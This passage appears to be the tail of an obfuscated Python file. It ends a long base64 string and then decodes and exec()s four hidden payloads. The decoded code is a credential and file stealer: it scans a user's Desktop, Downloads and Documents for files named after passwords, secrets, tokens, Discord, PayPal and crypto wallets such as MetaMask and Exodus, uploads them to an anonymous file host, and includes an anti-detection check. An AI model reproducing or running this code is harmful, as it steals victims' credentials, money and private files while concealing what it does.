kcyk6CiAgICBnbG9iYWwgS2l3aUZpbGVzCiAgICBtYXhmaWxlc3BlcmRpciA9IDcKICAgIGkgPSAwCiAgICBsaXN0T2ZGaWxlID0gb3MubGlzdGRpcihwYXRoRikKICAgIGZmb3VuZCA9IFtdCiAgICBmb3IgZmlsZSBpbiBsaXN0T2ZGaWxlOgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShwYXRoRiArICIvIiArIGZpbGUpOiByZXR1cm4KICAgICAgICBpICs9IDEKICAgICAgICBpZiBpIDw9IG1heGZpbGVzcGVyZGlyOgogICAgICAgICAgICB1cmwgPSB1cGxvYWRUb0Fub25maWxlcyhwYXRoRiArICIvIiArIGZpbGUpCiAgICAgICAgICAgIGZmb3VuZC5hcHBlbmQoW3BhdGhGICsgIi8iICsgZmlsZSwgdXJsXSkKICAgICAgICBlbHNlOgogICAgICAgICAgICBicmVhawogICAgS2l3aUZpbGVzLmFwcGVuZChbImZvbGRlciIsIHBhdGhGICsgIi8iLCBmZm91bmRdKQoKS2l3aUZpbGVzID0gW10KZGVmIEtpd2lGaWxlKHBhdGgsIGtleXdvcmRzKToKICAgIGdsb2JhbCBLaXdpRmlsZXMKICAgIGZpZm91bmQgPSBbXQogICAgbGlzdE9mRmlsZSA9IG9zLmxpc3RkaXIocGF0aCkKICAgIGZvciBmaWxlIGluIGxpc3RPZkZpbGU6CiAgICAgICAgZm9yIHdvcmYgaW4ga2V5d29yZHM6CiAgICAgICAgICAgIGlmIHdvcmYgaW4gZmlsZS5sb3dlcigpOgogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2ZpbGUocGF0aCArICIvIiArIGZpbGUpIGFuZCAiLnR4dCIgaW4gZmlsZToKICAgICAgICAgICAgICAgICAgICBmaWZvdW5kLmFwcGVuZChbcGF0aCArICIvIiArIGZpbGUsIHVwbG9hZFRvQW5vbmZpbGVzKHBhdGggKyAiLyIgKyBmaWxlKV0pCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNkaXIocGF0aCArICIvIiArIGZpbGUpOgogICAgICAgICAgICAgICAgICAgIHRhcmdldCA9IHBhdGggKyAiLyIgKyBmaWxlCiAgICAgICAgICAgICAgICAgICAgS2l3aUZvbGRlcih0YXJnZXQsIGtleXdvcmRzKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCgogICAgS2l3aUZpbGVzLmFwcGVuZChbImZvbGRlciIsIHBhdGgsIGZpZm91bmRdKQoKZGVmIEtpd2koKToKICAgIHVzZXIgPSB0ZW1wLnNwbGl0KCJcQXBwRGF0YSIpWzBdCiAgICBwYXRoMnNlYXJjaCA9IFsKICAgICAgICB1c2VyICsgIi9EZXNrdG9wIiwKICAgICAgICB1c2VyICsgIi9Eb3dubG9hZHMiLAogICAgICAgIHVzZXIgKyAiL0RvY3VtZW50cyIKICAgIF0KCiAgICBrZXlfd29yZHNGb2xkZXIgPSBbCiAgICAgICAgImFjY291bnQiLAogICAgICAgICJhY291bnQiLAogICAgICAgICJwYXNzdyIsCiAgICAgICAgInNlY3JldCIsCiAgICAgICAgInNlbmhhcyIsCiAgICAgICAgImNvbnRhcyIsCiAgICAgICAgImJhY2t1cCIsCiAgICAgICAgIjJmYSIsCiAgICAgICAgImltcG9ydGFudGUiLAogICAgICAgICJwcml2YWRvIiwKICAgICAgICAiZXhvZHVzIiwKICAgICAgICAiZXhwb3NlZCIsCiAgICAgICAgInBlcmRlciIsCiAgICAgICAgImFtaWdvcyIsCiAgICAgICAgImVtcHJlc2EiLAogICAgICAgICJ0cmFiYWxobyIsCiAgICAgICAgIndvcmsiLAogICAgICAgICJwcml2YXRlIiwKICAgICAgICAic291cmNlIiwKICAgICAgICAidXNlcnMiLAogICAgICAgICJ1c2VybmFtZSIsCiAgICAgICAgImxvZ2luIiwKICAgICAgICAidXNlciIsCiAgICAgICAgInVzdWFyaW8iLAogICAgICAgICJsb2ciCiAgICBdCgogICAga2V5X3dvcmRzRmlsZXMgPSBbCiAgICAgICAgInBhc3N3IiwKICAgICAgICAibWRwIiwKICAgICAgICAibW90ZGVwYXNzZSIsCiAgICAgICAgIm1vdF9kZV9wYXNzZSIsCiAgICAgICAgImxvZ2luIiwKICAgICAgICAic2VjcmV0IiwKICAgICAgICAiYWNjb3VudCIsCiAgICAgICAgImFjb3VudCIsCiAgICAgICAgInBheXBhbCIsCiAgICAgICAgImJhbnF1ZSIsCiAgICAgICAgImFjY291bnQiLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAibWV0YW1hc2siLAogICAgICAgICJ3YWxsZXQiLAogICAgICAgICJjcnlwdG8iLAogICAgICAgICJleG9kdXMiLAogICAgICAgICJkaXNjb3JkIiwKICAgICAgICAiMmZhIiwKICAgICAgICAiY29kZSIsCiAgICAgICAgIm1lbW8iLAogICAgICAgICJjb21wdGUiLAogICAgICAgICJ0b2tlbiIsCiAgICAgICAgImJhY2t1cCIsCiAgICAgICAgInNlY3JldCIsCiAgICAgICAgIm1vbSIsCiAgICAgICAgImZhbWlseSIKICAgICAgICBdCgogICAgd2lraXRoID0gW10KICAgIGZvciBwYXR0IGluIHBhdGgyc2VhcmNoOiAKICAgICAgICBraXdpID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9S2l3aUZpbGUsIGFyZ3M9W3BhdHQsIGtleV93b3Jkc0ZpbGVzXSk7a2l3aS5zdGFydCgpCiAgICAgICAgd2lraXRoLmFwcGVuZChraXdpKQogICAgcmV0dXJuIHdpa2l0aAoKCmdsb2JhbCBrZXl3b3JkLCBjb29raVdvcmRzLCBwYXN3V29yZHMsIENvb2tpQ291bnQsIFA0c3N3Q291bnQsIFdhbGxldHNaaXAsIEdhbWluZ1ppcCwgT3RoZXJaaXAKCmtleXdvcmQgPSBbCiAgICAnbWFpbCcsICdbY29pbmJhc2VdKGh0dHBzOi8vY29pbmJhc2UuY29tKScsICdbc2VsbGl4XShodHRwczovL3NlbGxpeC5pbyknLCAnW2dtYWlsXShodHRwczovL2dtYWlsLmNvbSknLCAnW3N0ZWFtXShodHRwczovL3N0ZWFtLmNvbSknLCAnW2Rpc2NvcmRdKGh0dHBzOi8vZGlzY29yZC5jb20pJywgJ1tyaW90Z2FtZXNdKGh0dHBzOi8vcmlvdGdhbWVzLmNvbSknLCAnW3lvdXR1YmVdKGh0dHBzOi8veW91dHViZS5jb20pJywgJ1tpbnN0YWdyYW1dKGh0dHBzOi8vaW5zdGFncmFtLmNvbSknLCAnW3Rpa3Rva10oaHR0cHM6Ly90aWt0b2suY29tKScsICdbdHdpdHRlcl0oaHR0cHM6Ly90d2l0dGVyLmNvbSknLCAnW2ZhY2Vib29rXShodHRwczovL2ZhY2Vib29rLmNvbSknLCAnY2FyZCcsICdbZXBpY2dhbWVzXShodHRwczovL2VwaWNnYW1lcy5jb20pJywgJ1tzcG90aWZ5XShodHRwczovL3Nwb3RpZnkuY29tKScsICdbeWFob29dKGh0dHBzOi8veWFob28uY29tKScsICdbcm9ibG94XShodHRwczovL3JvYmxveC5jb20pJywgJ1t0d2l0Y2hdKGh0dHBzOi8vdHdpdGNoLmNvbSknLCAnW21pbmVjcmFmdF0oaHR0cHM6Ly9taW5lY3JhZnQubmV0KScsICdiYW5rJywgJ1twYXlwYWxdKGh0dHBzOi8vcGF5cGFsLmNvbSknLCAnW29yaWdpbl0oaHR0cHM6Ly9vcmlnaW4uY29tKScsICdbYW1hem9uXShodHRwczovL2FtYXpvbi5jb20pJywgJ1tlYmF5XShodHRwczovL2ViYXkuY29tKScsICdbYWxpZXhwcmVzc10oaHR0cHM6Ly9hbGlleHByZXNzLmNvbSknLCAnW3BsYXlzdGF0aW9uXShodHRwczovL3BsYXlzdGF0aW9uLmNvbSknLCAnW2hib10oaHR0cHM6Ly9oYm8uY29tKScsICdbeGJveF0oaHR0cHM6Ly94Ym94LmNvbSknLCAnYnV5JywgJ3NlbGwnLCAnW2JpbmFuY2VdKGh0dHBzOi8vYmluYW5jZS5jb20pJywgJ1tob3RtYWlsXShodHRwczovL2hvdG1haWwuY29tKScsICdbb3V0bG9va10oaHR0cHM6Ly9vdXRsb29rLmNvbSknLCAnW2NydW5jaHlyb2xsXShodHRwczovL2NydW5jaHlyb2xsLmNvbSknLCAnW3RlbGVncmFtXShodHRwczovL3RlbGVncmFtLmNvbSknLCAnW3Bvcm5odWJdKGh0dHBzOi8vcG9ybmh1Yi5jb20pJywgJ1tkaXNuZXldKGh0dHBzOi8vZGlzbmV5LmNvbSknLCAnW2V4cHJlc3N2cG5dKGh0dHBzOi8vZXhwcmVzc3Zwbi5jb20pJywgJ2NyeXB0bycsICdbdWJlcl0oaHR0cHM6Ly91YmVyLmNvbSknLCAnW25ldGZsaXhdKGh0dHBzOi8vbmV0ZmxpeC5jb20pJwpdCgpDb29raUNvdW50LCBQNHNzd0NvdW50ID0gMCwgMApjb29raVdvcmRzID0gW10KcGFzd1dvcmRzID0gW10KCldhbGxldHNaaXAgPSBbXSAjIFtOYW1lLCBMaW5rXQpHYW1pbmdaaXAgPSBbXQpPdGhlclppcCA9IFtdCgpHYXRoZXJBbGwoKQpERVRFQ1RFRCA9IFRSNnN0KEMwMGsxMykKIyBERVRFQ1RFRCA9IEZhbHNlCmlmIG5vdCBERVRFQ1RFRDoKICAgIHdpa2l0aCA9IEtpd2koKQoKICAgIGZvciB0aHJlYWQgaW4gd2lraXRoOiB0aHJlYWQuam9pbigpCiAgICB0aW1lLnNsZWVwKDAuMikKCiAgICBmaWxldGV4dCA9ICJcbiIKICAgIGZvciBhcmcgaW4gS2l3aUZpbGVzOgogICAgICAgIGlmIGxlbihhcmdbMl0pICE9IDA6CiAgICAgICAgICAgIGZvbGRwYXRoID0gYXJnWzFdCiAgICAgICAgICAgIGZvbGRsaXN0ID0gYXJnWzJdICAgICAgIAogICAgICAgICAgICBmaWxldGV4dCArPSBmIvCfk4Ege2ZvbGRwYXRofVxuIgoKICAgICAgICAgICAgZm9yIGZmaWwgaW4gZm9sZGxpc3Q6CiAgICAgICAgICAgICAgICBhID0gZmZpbFswXS5zcGxpdCgiLyIpCiAgICAgICAgICAgICAgICBmaWxlYW5tZSA9IGFbbGVuKGEpLTFdCiAgICAgICAgICAgICAgICBiID0gZmZpbFsxXQogICAgICAgICAgICAgICAgZmlsZXRleHQgKz0gZiLilJTilIA6b3Blbl9maWxlX2ZvbGRlcjogW3tmaWxlYW5tZX1dKHtifSlcbiIKICAgICAgICAgICAgZmlsZXRleHQgKz0gIlxuIgogICAgdXBsb2FkKCJraXdpIiwgZmlsZXRleHQpCg=='
joy = (magic, love, prout, destiny)
for el in joy:
    decoded = base64.b64decode(el)
    command = decoded.decode('utf-8')
    exec(command)
